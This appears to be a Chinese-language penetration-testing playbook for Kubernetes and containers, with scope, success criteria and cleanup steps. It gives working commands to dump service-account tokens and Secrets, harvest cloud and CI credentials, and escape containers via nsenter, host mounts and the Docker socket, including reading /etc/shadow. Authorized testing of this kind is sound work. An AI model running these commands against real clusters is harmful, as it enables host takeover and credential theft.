# 02 K8s 与容器

> 配套 `ad-cloud/SKILL.md`、`references/k8s-and-container.md`。
> 只操作授权集群/命名空间/镜像；先记录 `kubectl config current-context` 与 token 过期时间。
## 0. 离线体检
```bash
python Tool/scripts/adcloud-check.py --kubeconfig <kubeconfig>
python Tool/scripts/adcloud-check.py --aws-creds ~/.aws/credentials --json
```
关注 `current-context`、`insecure-skip-tls-verify`、无凭据用户、cluster-admin 绑定、
JWT `exp`/`groups`、`exec` 插件。**成功判据**：能列出上下文、可疑绑定与 token 过期时间。
**失败判据**：只凭文件名/用户名判断权限；离线结果被当成在线 RBAC 结论。
## 1. 身份与 RBAC
```bash
export KUBECONFIG=<kubeconfig>
kubectl config current-context
kubectl auth whoami 2>/dev/null || kubectl auth can-i --list
kubectl auth can-i --list
kubectl auth can-i --list --as=system:serviceaccount:<ns>:<sa>
kubectl get clusterrolebinding -o wide
kubectl get rolebinding -A -o wide
kubectl get clusterrole -o json | jq \
  '.items[] | select(.rules[]?.verbs[]?=="*") | .metadata.name'
```

重点权限：`create pods`/`daemonsets`/`jobs`（挂 hostPath/privileged/hostPID）、
`get`/`list secrets`（SA token/镜像凭据/云密钥）、`patch`/`update` workloads、
`impersonate`、`bind`/`escalate`、`create pods/exec`。

**成功判据**：`kubectl auth can-i <verb> <resource>` 返回 `yes`，并实际完成一个
只读/低影响动作（如读取测试 Secret、创建带标记的 Pod）。
**失败判据**：只有 `list` 而 `get` 被拒；`can-i` 为 yes 但 Admission/PSP/Quota 拦住；
`Unauthorized` 未先核对 token `exp`/`iss`/`aud`。
## 2. Token 与 API
```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
kubectl get secrets -A | grep -E 'service-account-token|dockerconfigjson'
kubectl get secret <name> -n <ns> -o jsonpath='{.data.token}' | base64 -d

TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -s --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/<ns>/pods
```

- 不落盘解析 JWT：base64url 解码第二段，记录 `sub`、`groups`、`exp`、`aud`、`iss`；
  `system:masters` 绕过 RBAC，`system:serviceaccounts` 覆盖全部 SA。
- 高价值目标：`kube-system` 的 controller/CNI/Ingress SA、CI runner SA、cluster-admin 绑定。

**成功判据**：API 返回 200 且列出授权内资源；token 字段与权限面一致。
**失败判据**：401（过期/无效）、403（权限不足）却继续盲试；把完整 token 留在命令历史/报告。
## 3. 容器逃逸面

```bash
id; capsh --print 2>/dev/null
cat /proc/1/cgroup; cat /proc/self/status | grep -E 'CapEff|Seccomp'
mount | grep -E 'hostPath|/host|docker.sock|containerd.sock|kubelet'
ls -l /var/run/docker.sock /run/containerd/containerd.sock 2>/dev/null
```

```bash
# privileged / CAP_SYS_ADMIN：只读优先
mkdir -p /mnt/host
mount --bind / /mnt/host 2>/dev/null || mount -t proc proc /mnt/host/proc
ls /mnt/host; cat /mnt/host/etc/hostname
nsenter -t 1 -m -u -i -n -p -- id

# hostPath / hostPID
ls -la /var/lib/kubelet/pods 2>/dev/null
find / -maxdepth 3 \( -name 'kubelet.conf' -o -name 'admin.conf' \) 2>/dev/null
ps aux | head; nsenter -t 1 -m -u -i -n -p -- cat /etc/shadow

# Docker / containerd socket
docker -H unix:///var/run/docker.sock ps
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host --privileged \
  alpine chroot /host sh
ctr -a /run/containerd/containerd.sock -n k8s.io containers list
```

- 其他面：cgroup v1 `release_agent`（需 `CAP_SYS_ADMIN` 且 cgroup 未只读）、
  `CAP_SYS_PTRACE` 注入宿主进程、`CAP_NET_ADMIN` 流量劫持、内核漏洞按版本匹配。
- `hostNetwork` 只能看到节点网络，不等于宿主文件系统，不要混淆判据。

**成功判据**：在宿主命名空间执行 `id`，或读到宿主文件系统/凭据，并有完整复现命令。
**失败判据**：`Operation not permitted`（缺 CAP_SYS_ADMIN）、PID 1 仍是容器 init、
只有“Pod 是 privileged”的配置本身。
## 4. Secret、镜像与 CI/CD

```bash
kubectl get secret <name> -n <ns> -o jsonpath='{.data.\.dockerconfigjson}' \
  | base64 -d | jq .
trivy image --severity HIGH,CRITICAL <image>
trivy fs --scanners secret .
env | grep -Ei 'AWS|AZURE|GCP|TOKEN|SECRET|CI_|GITHUB|GITLAB|DOCKER'
ls -la ~/.aws ~/.docker ~/.config/gcloud 2>/dev/null
cat ~/.docker/config.json 2>/dev/null
```

- 镜像层重点：`.git`、`.env`、`~/.aws`、`~/.docker/config.json`、CI token、签名密钥。
- CI token 看 scope：能否写仓库、读 protected env、触发其他流水线、AssumeRole。
- 云 OIDC 信任策略看 `sub`/`aud` 是否过宽（`repo:*`、`ref:*`）。

**成功判据**：用拉取凭据能登录/拉取授权内镜像；用 CI token 读到受保护变量、
推送镜像或 AssumeRole 到部署角色，且有 API 返回。
**失败判据**：只看到 Secret 名称；镜像只有“版本旧”；token 只读/环境隔离即判失败。
## 5. 降级、证据与边界

降级顺序：只读 API 枚举 → 现有 Pod `exec` → 创建带标记 Pod →
修改现有工作负载 → 节点级逃逸。每级都要单独授权。

- `Unauthorized` 查 `exp`/`iss`/`aud`；`Forbidden` 查 `auth can-i --list`；无法创建 Pod 查 PSA/Quota；
  逃逸失败查 CAP/挂载/seccomp；Secret 为空改用 projected token 或换目标。

- 证据：命令、时间、context/namespace、前后 `auth can-i`、API 返回、Pod 清单、节点 `id`。
- 清理：删除测试 Pod/Job/DaemonSet、撤销临时 RoleBinding、删除上传工具与 Secret 副本；
  恢复被改的 Deployment。

**误报/边界**：有权限不等于已逃逸；镜像有 CVE 不等于可提权；不把
`hostNetwork`/`privileged` 配置直接写成“已控制节点”。
